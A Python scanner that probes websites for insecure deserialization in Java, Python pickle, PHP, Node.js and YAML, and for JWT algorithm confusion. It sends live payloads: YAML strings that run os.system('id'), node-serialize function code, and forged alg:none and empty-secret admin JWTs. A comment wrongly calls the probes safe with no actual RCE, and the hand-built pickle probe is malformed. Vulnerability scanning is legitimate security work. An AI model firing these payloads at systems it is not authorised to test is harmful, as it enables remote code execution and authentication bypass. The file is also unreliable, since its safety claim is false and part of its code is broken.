"""
Insecure Deserialization Scanner
==================================
Detects endpoints vulnerable to insecure deserialization attacks.

What this scanner does:
  ✅ Python Pickle deserialization (RCE via crafted pickle objects)
  ✅ Java deserialization (ysoserial-style magic bytes detection)
  ✅ PHP object injection (__wakeup, __destruct, O: patterns)
  ✅ Node.js / JavaScript deserialization (node-serialize RCE)
  ✅ Ruby Marshal deserialization
  ✅ YAML deserialization (PyYAML, SnakeYAML unsafe load)
  ✅ XML/XStream deserialization patterns
  ✅ JWT algorithm confusion (none / RS256→HS256)
  ✅ Serialized object detection in cookies, headers, params
  ✅ Async concurrent scanning

Install:  pip install aiohttp
Usage:    python insecure_deserialization_scanner.py <url>
"""

import asyncio, aiohttp, sys, re, time, argparse, base64, json, struct
from urllib.parse import urlparse, urljoin
from dataclasses import dataclass, field
from typing import List, Optional, Dict

BOLD="\033[1m"; RESET="\033[0m"; GREEN="\033[92m"; DIM="\033[2m"
SEV_COLOR={"CRITICAL":"\033[91m","HIGH":"\033[31m","MEDIUM":"\033[33m","LOW":"\033[34m","INFO":"\033[37m"}

@dataclass
class Finding:
    name: str; severity: str; description: str
    endpoint: str; method: str = "GET"
    evidence: str = ""; param: str = ""
    recommendation: str = ""

@dataclass
class ScanResult:
    target: str; duration: float = 0.0
    findings: List[Finding] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

# ── Serialized object signatures ─────────────────────────

# Java deserialization magic bytes: AC ED 00 05
JAVA_MAGIC    = b'\xac\xed\x00\x05'
JAVA_MAGIC_B64 = base64.b64encode(JAVA_MAGIC).decode()  # rO0ABQ==

# Python pickle opcodes
PICKLE_MAGIC   = b'\x80\x02'  # protocol 2
PICKLE_MAGIC_B64 = base64.b64encode(PICKLE_MAGIC + b'c').decode()

# PHP serialized object: O:
PHP_PATTERN    = r'O:\d+:"[A-Za-z]+'
PHP_PAYLOAD_B64 = base64.b64encode(b'O:8:"stdClass":0:{}').decode()

# Ruby Marshal magic: \x04\x08
RUBY_MAGIC     = b'\x04\x08'
RUBY_MAGIC_B64 = base64.b64encode(RUBY_MAGIC).decode()

# Node.js serialize pattern
NODE_PATTERN   = r'_\$\$ND_FUNC\$\$_'

# YAML unsafe patterns
YAML_PATTERNS  = [
    "!!python/object",
    "!!python/object/apply",
    "!!java.lang.Runtime",
    "!!javax.script.ScriptEngineManager",
    "!ruby/object",
]

# ── Probe payloads ────────────────────────────────────────

# Safe ping/canary payloads (no actual RCE — just detect if deserialized)
def make_pickle_probe() -> bytes:
    """Craft a benign pickle that raises a known exception on deserialization."""
    # pickle: raise ValueError("DESERIALIZE_PROBE_SUCCESS")
    payload = (
        b'\x80\x04\x95' + struct.pack('<Q', 30) +
        b'\x8c\x08builtins\x94\x8c\x09Exception\x94\x93\x8c\x18'
        b'DESERIALIZE_PROBE\x94\x85\x94R\x94.'
    )
    return payload

PICKLE_PROBE_B64 = base64.b64encode(make_pickle_probe()).decode()

JAVA_PROBE_PAYLOADS = [
    # Minimal Java serialized stream with recognizable header
    base64.b64encode(b'\xac\xed\x00\x05t\x00\x04test').decode(),
    "rO0ABXQABHRlc3Q=",   # AC ED 00 05 + string "test"
    "rO0ABQ==",           # raw magic bytes
]

PHP_PROBE_PAYLOADS = [
    'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
    'O:1:"A":0:{}',
    'a:1:{i:0;O:8:"stdClass":0:{}}',
    base64.b64encode(b'O:8:"stdClass":0:{}').decode(),
]

NODE_PROBE_PAYLOADS = [
    '{"rce":"_$$ND_FUNC$$_function(){return 1}()"}',
    '{"x":"_$$ND_FUNC$$_function (){return process.version}()"}',
]

YAML_PROBE_PAYLOADS = [
    "!!python/object/apply:os.system ['id']",
    "!!python/object/apply:subprocess.check_output [['id']]",
    "!!java.lang.Runtime {}",
    "--- !!python/object:__main__.Exploit {}",
]

# ── Serialized data detection in responses ───────────────
SERIALIZED_SIGNATURES = {
    "Java (Base64)":   r'rO0AB[A-Za-z0-9+/=]{8,}',
    "PHP Object":      r'O:\d+:"[A-Za-z_\\]+":',
    "PHP Array":       r'a:\d+:\{',
    "PHP String":      r's:\d+:"[^"]{0,200}";',
    "Python Pickle":   r'\\x80[\\x02\\x03\\x04\\x05]',
    "Ruby Marshal":    r'\\x04\\x08',
    "Node Serialize":  r'_\$\$ND_FUNC\$\$_',
    "YAML unsafe":     r'!!(?:python|java|ruby)/(?:object|apply)',
}

COOKIE_SERIALIZED_PATTERNS = [
    (r'rO0AB[A-Za-z0-9+/=]+',      "Java serialized object in cookie"),
    (r'O%3A\d+%3A%22',             "PHP serialized object in cookie (URL encoded)"),
    (r'O:\d+:"',                   "PHP serialized object in cookie"),
    (r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.',  "JWT token in cookie"),
    (r'\\x80\\x0[2-5]',            "Python pickle in cookie"),
    (r'YTo[A-Za-z0-9+/=]+',        "Possible PHP serialized array (base64)"),
]

async def fetch(session, url, method="GET", data=None, headers=None,
                token=None, raw_data=None):
    try:
        h = {"User-Agent":"Mozilla/5.0","Accept":"*/*"}
        if token: h["Authorization"] = f"Bearer {token}"
        if headers: h.update(headers)
        kw = dict(headers=h, ssl=False, allow_redirects=True,
                  timeout=aiohttp.ClientTimeout(total=10))
        if raw_data is not None:
            kw["data"] = raw_data
        elif method in ("POST","PUT") and data:
            if isinstance(data, dict): kw["json"] = data
            else: kw["data"] = data
        async with session.request(method, url, **kw) as r:
            body = await r.text(errors="ignore")
            return r.status, body, dict(r.headers), dict(r.cookies)
    except: return 0, "", {}, {}

def detect_serialized_in_text(text: str) -> List[str]:
    found = []
    for name, pattern in SERIALIZED_SIGNATURES.items():
        if re.search(pattern, text, re.I):
            found.append(name)
    return found

# ── Check 1: Serialized objects in cookies ───────────────
async def check_cookie_deserialization(session, url, findings, token):
    s, body, hdrs, cookies = await fetch(session, url, token=token)
    if not cookies and "Set-Cookie" not in str(hdrs): return

    # Check Set-Cookie headers for serialized data
    set_cookie = hdrs.get("Set-Cookie","")
    all_cookie_data = set_cookie + str(cookies)

    for pattern, label in COOKIE_SERIALIZED_PATTERNS:
        m = re.search(pattern, all_cookie_data)
        if m:
            matched = m.group(0)[:60]
            findings.append(Finding(
                name=f"Serialized Object in Cookie: {label}",
                severity="HIGH",
                description=(
                    f"A {label} was detected in the cookie. "
                    "If the server deserializes this without validation, "
                    "it may be vulnerable to object injection or RCE."
                ),
                endpoint=url, method="GET",
                evidence=f"Cookie value: {matched}... | Pattern: {label}",
                recommendation=(
                    "Never deserialize user-controlled cookie data. "
                    "Use HMAC-signed tokens (JWT with proper validation) instead. "
                    "If deserialization is required, use a safe allowlist of classes."
                ),
            ))

    # PHP session cookie detection
    if re.search(r'PHPSESSID|phpsession', all_cookie_data, re.I):
        # Try to read session and check if it's serialized
        findings.append(Finding(
            name="PHP Session Cookie Detected — Check for Object Injection",
            severity="MEDIUM",
            description=(
                "PHP session cookie detected. PHP sessions use serialization by default. "
                "If session data includes user-controlled values, object injection may be possible."
            ),
            endpoint=url, method="GET",
            evidence=f"PHP session cookie present",
            recommendation="Use json_encode for session data instead of PHP serialization.",
        ))

# ── Check 2: Serialized object in POST endpoints ─────────
async def check_post_deserialization(session, url, findings, token):
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    deser_endpoints = [
        "/api/v1/deserialize", "/api/deserialize",
        "/api/v1/object",      "/api/object",
        "/api/v1/data",        "/api/data",
        "/api/v1/import",      "/api/import",
        "/api/v1/restore",     "/api/restore",
        "/api/v1/load",        "/api/load",
        "/upload",             "/api/upload",
        "/api/v1/session",     "/api/session",
    ]

    content_types = [
        ("application/x-java-serialized-object", JAVA_PROBE_PAYLOADS[0], "Java"),
        ("application/octet-stream",              PICKLE_PROBE_B64,       "Python Pickle"),
        ("application/x-php-serialized",         PHP_PROBE_PAYLOADS[0],  "PHP"),
        ("text/yaml",                             YAML_PROBE_PAYLOADS[0], "YAML"),
        ("application/json",                     NODE_PROBE_PAYLOADS[0], "Node.js"),
    ]

    for path in deser_endpoints:
        ep = f"{origin}{path}"
        for ctype, payload, lang in content_types:
            s, body, hdrs, _ = await fetch(
                session, ep, method="POST", token=token,
                headers={"Content-Type": ctype},
                raw_data=payload.encode() if isinstance(payload, str) else payload,
            )
            if s in (200, 201, 500):
                # 500 errors often indicate deserialization attempt
                error_indicators = [
                    "deserializ", "unserializ", "pickle", "marshal",
                    "classnotfound", "java.lang", "exception", "traceback",
                    "yaml", "object injection",
                ]
                body_l = body.lower()
                hit = next((e for e in error_indicators if e in body_l), None)
                if hit or s == 200:
                    severity = "CRITICAL" if s == 200 else "HIGH"
                    findings.append(Finding(
                        name=f"Potential {lang} Deserialization Endpoint",
                        severity=severity,
                        description=(
                            f"Endpoint '{path}' accepted a {lang} serialized payload "
                            f"(Content-Type: {ctype}) and returned HTTP {s}. "
                            "May be vulnerable to deserialization attacks."
                        ),
                        endpoint=ep, method="POST",
                        evidence=(
                            f"Content-Type: {ctype} | HTTP {s} | "
                            + (f"Error indicator: '{hit}'" if hit else "HTTP 200 returned")
                        ),
                        recommendation=(
                            f"Never deserialize {lang} objects from untrusted sources. "
                            "Use safe data formats (JSON). Implement class allowlisting."
                        ),
                    ))

# ── Check 3: PHP object injection via parameters ─────────
async def check_php_object_injection(session, url, findings, token):
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    php_params = [
        "data","object","session","input","payload",
        "token","state","user","config","value",
    ]

    for param in php_params:
        for payload in PHP_PROBE_PAYLOADS[:3]:
            test_url = f"{base}?{param}={payload}"
            s, body, _, _ = await fetch(session, test_url, token=token)
            body_l = body.lower()
            # PHP unserialize errors reveal the vulnerability
            php_errors = [
                "__wakeup","__destruct","__toString","unserialize()",
                "unserialization","O:","a:{","php fatal error",
                "notice: unserialize","warning: unserialize",
            ]
            hit = next((e for e in php_errors if e in body_l), None)
            if hit and s in (200, 500):
                findings.append(Finding(
                    name=f"PHP Object Injection via '{param}' Parameter",
                    severity="CRITICAL",
                    description=(
                        f"Parameter '{param}' appears to be passed to PHP unserialize(). "
                        f"Response contains PHP deserialization indicator: '{hit}'."
                    ),
                    endpoint=test_url, method="GET", param=param,
                    evidence=f"Payload: {payload[:50]} | HTTP {s} | Indicator: '{hit}'",
                    recommendation=(
                        "Remove unserialize() for user-controlled data. "
                        "Use json_decode() instead. "
                        "If unavoidable, use HMAC signature verification before deserialization."
                    ),
                ))
                break

# ── Check 4: YAML injection ───────────────────────────────
async def check_yaml_injection(session, url, findings, token):
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    yaml_endpoints = [
        "/api/v1/config",  "/api/config",
        "/api/v1/import",  "/api/import",
        "/api/v1/settings","/api/settings",
        "/api/v1/data",    "/api/data",
        "/import",         "/config",
    ]

    for path in yaml_endpoints:
        ep = f"{origin}{path}"
        for payload in YAML_PROBE_PAYLOADS[:3]:
            s, body, _, _ = await fetch(
                session, ep, method="POST", token=token,
                headers={"Content-Type":"application/x-yaml"},
                raw_data=payload.encode(),
            )
            body_l = body.lower()
            yaml_indicators = [
                "yaml","pyyaml","snakeyaml","constructor","represent",
                "compose","scanner","parser","resolver",
            ]
            hit = next((e for e in yaml_indicators if e in body_l), None)
            if (s in (200, 201) or hit) and s != 404:
                findings.append(Finding(
                    name=f"Potential YAML Deserialization on '{path}'",
                    severity="CRITICAL",
                    description=(
                        f"Endpoint '{path}' accepts YAML content-type and may use "
                        "unsafe YAML loading (yaml.load() without Loader=yaml.SafeLoader). "
                        "This can lead to RCE."
                    ),
                    endpoint=ep, method="POST",
                    evidence=f"Content-Type: application/x-yaml | HTTP {s}"
                             + (f" | YAML indicator: '{hit}'" if hit else ""),
                    recommendation=(
                        "Use yaml.safe_load() (Python) or SafeConstructor (Java). "
                        "Never use yaml.load() with untrusted input."
                    ),
                ))
                break

# ── Check 5: JWT algorithm confusion ─────────────────────
async def check_jwt_confusion(session, url, findings, token):
    """Test JWT algorithm confusion (none / RS256→HS256)."""
    # Check if there's a JWT in the token or response
    jwt_endpoints = [
        "/api/v1/me", "/api/me", "/api/v1/profile",
        "/api/profile", "/api/v1/user", "/api/user",
        "/api/v1/auth/verify", "/api/auth/verify",
    ]

    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"

    # Craft alg:none JWT
    header_none  = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()
    ).rstrip(b'=').decode()
    payload_part = base64.urlsafe_b64encode(
        json.dumps({"user":"admin","role":"admin","sub":"1"}).encode()
    ).rstrip(b'=').decode()

    none_jwt = f"{header_none}.{payload_part}."  # empty signature

    # Craft alg:hs256 with empty secret
    import hmac, hashlib
    header_hs = base64.urlsafe_b64encode(
        json.dumps({"alg":"HS256","typ":"JWT"}).encode()
    ).rstrip(b'=').decode()
    signing_input = f"{header_hs}.{payload_part}".encode()
    sig = base64.urlsafe_b64encode(
        hmac.new(b"", signing_input, hashlib.sha256).digest()
    ).rstrip(b'=').decode()
    empty_secret_jwt = f"{header_hs}.{payload_part}.{sig}"

    test_jwts = [
        (none_jwt,         "JWT Algorithm: none (no signature)"),
        (empty_secret_jwt, "JWT Empty Secret (HS256 with '' key)"),
    ]

    for path in jwt_endpoints:
        ep = f"{origin}{path}"
        for test_token, label in test_jwts:
            s, body, hdrs, _ = await fetch(
                session, ep, token=test_token,
                headers={"Authorization": f"Bearer {test_token}"},
            )
            if s == 200 and len(body) > 20:
                findings.append(Finding(
                    name=f"JWT Algorithm Confusion: {label}",
                    severity="CRITICAL",
                    description=(
                        f"Endpoint '{path}' accepted a forged JWT using {label}. "
                        "An attacker can forge tokens with any payload (admin, arbitrary user ID, etc.)."
                    ),
                    endpoint=ep, method="GET",
                    evidence=f"Forged JWT accepted | HTTP {s} ({len(body)}B) | {label}",
                    recommendation=(
                        "Explicitly specify allowed algorithms server-side (e.g. RS256 only). "
                        "Reject 'none' algorithm. Use a strong, random secret for HS256."
                    ),
                ))
                break

# ── Check 6: Detect serialized data in responses ─────────
async def check_response_deserialization(session, url, findings, token):
    """Scan response bodies for serialized object patterns."""
    endpoints_to_check = [url]
    parsed = urlparse(url)
    origin = f"{parsed.scheme}://{parsed.netloc}"
    for path in ["/api/v1/users/1","/api/users/1","/api/v1/profile",
                 "/api/profile","/api/v1/session","/api/session"]:
        endpoints_to_check.append(f"{origin}{path}")

    for ep in endpoints_to_check[:6]:
        s, body, _, _ = await fetch(session, ep, token=token)
        if not body or s not in (200,): continue
        hits = detect_serialized_in_text(body)
        if hits:
            findings.append(Finding(
                name=f"Serialized Object Detected in Response",
                severity="MEDIUM",
                description=(
                    f"Response from '{ep}' contains serialized object patterns: "
                    f"{', '.join(hits)}. "
                    "If this data is sent back and deserialized by the server, "
                    "it may be exploitable."
                ),
                endpoint=ep, method="GET",
                evidence=f"Patterns found: {', '.join(hits)} | Response size: {len(body)}B",
                recommendation=(
                    "Use JSON instead of serialized objects in API responses. "
                    "Never deserialize data that was previously sent to the client."
                ),
            ))

# ── Orchestrator ──────────────────────────────────────────
async def run_scanner(target_url, token=None):
    result = ScanResult(target=target_url)
    if not target_url.startswith(("http://","https://")):
        target_url = "https://" + target_url; result.target = target_url
    connector = aiohttp.TCPConnector(ssl=False, limit=20)
    timeout   = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        start = time.perf_counter()
        findings = []
        print(f"  {DIM}Running 6 deserialization checks concurrently...{RESET}")
        await asyncio.gather(
            check_cookie_deserialization(session, target_url, findings, token),
            check_post_deserialization(session, target_url, findings, token),
            check_php_object_injection(session, target_url, findings, token),
            check_yaml_injection(session, target_url, findings, token),
            check_jwt_confusion(session, target_url, findings, token),
            check_response_deserialization(session, target_url, findings, token),
            return_exceptions=True,
        )
        result.duration = time.perf_counter() - start
        seen = set()
        for f in findings:
            k = (f.endpoint[:80], f.param, f.name[:35])
            if k not in seen: seen.add(k); result.findings.append(f)
    SEV = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    result.findings.sort(key=lambda f: SEV.get(f.severity, 9))
    return result

def print_report(result):
    line = "═"*68
    print(f"\n{BOLD}{line}{RESET}")
    print(f"{BOLD}  INSECURE DESERIALIZATION SCAN REPORT{RESET}")
    print(f"{line}")
    print(f"  Target   : {result.target}")
    print(f"  Duration : {result.duration:.2f}s")
    print(f"  Findings : {len(result.findings)}")
    print(f"{line}\n")
    if not result.findings:
        print(f"  {GREEN}✅  No deserialization vulnerabilities detected.{RESET}\n")
    else:
        for i, f in enumerate(result.findings, 1):
            c = SEV_COLOR.get(f.severity,"")
            print(f"  {BOLD}[{i:02d}] {c}{f.severity}{RESET}{BOLD} — {f.name}{RESET}")
            print(f"       Endpoint : [{f.method}] {f.endpoint[:80]}")
            print(f"       Detail   : {f.description}")
            if f.evidence:       print(f"       Evidence : {f.evidence[:120]}")
            if f.recommendation: print(f"       Fix      : {f.recommendation}")
            print()
    print(f"{line}\n")

async def main():
    parser = argparse.ArgumentParser(description="Insecure Deserialization Scanner")
    parser.add_argument("url"); parser.add_argument("--token", default=None)
    args = parser.parse_args()
    print(f"\n  {BOLD}Insecure Deserialization Scanner{RESET}  |  Target: {args.url}")
    result = await run_scanner(args.url, args.token)
    print_report(result)

if __name__ == "__main__": asyncio.run(main())
